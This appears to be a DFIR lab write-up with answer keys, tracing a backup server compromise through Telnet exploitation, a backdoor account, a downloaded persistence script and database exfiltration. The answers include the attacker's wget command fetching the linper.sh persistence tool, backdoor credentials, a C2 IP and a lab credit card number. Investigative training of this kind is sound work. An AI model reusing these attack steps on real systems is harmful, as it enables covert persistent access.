![alt text](image.png)
# This lab’s severity is very easy
# Description:
In this lab, you act as a Junior SOC Analyst at an MSSP responsible for investigating a suspected data exfiltration incident involving a compromised backup server. A Data Loss Prevention (DLP) alert indicated unusual outbound activity, raising concerns of potential sensitive data leakage.

The affected system, identified as a low-usage backup server, was found to have been exploited through a vulnerability in the Telnet protocol, allowing the attacker to gain remote root access. The investigation involves analyzing network telemetry and logs to reconstruct the attacker’s actions, including initial compromise, persistence establishment, and data exfiltration.

Throughout the case, the attacker leverages a known vulnerability (CVE-2026-24061) to gain access, creates a backdoor account for persistence, deploys a remote access tool via a downloaded script, and ultimately exfiltrates sensitive database information.

The objective of this exercise is to trace the full attack chain, identify key indicators of compromise (IOCs), and extract critical forensic artifacts to support incident response and regulatory notification requirements.

# Scenario:
You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.

## Task 1:
What CVE is associated with the vulnerability exploited in the Telnet protocol?
```text
CVE-2026-24061
```

## Task 2:
When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?
```text
2026-01-27 10:39:28
```

## Task 3:
What is the hostname of the targeted server?
```text
backup-secondary
```

## Task 4:
The attacker created a backdoor account to maintain future access. What username and password were set for that account?
```text
cleanupsvc:YouKnowWhoiam69
```

## Task 5:
What was the full command the attacker used to download the persistence script?
```text
wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
```

## Task 6:
The attacker installed remote access persistence using the persistence script. What is the C2 IP address?
```text
91.99.25.54
```

## Task 7:
The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?
```text
2026-01-27 10:49:54
```

## Task 8:
Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.
```text
5312269047781209
```
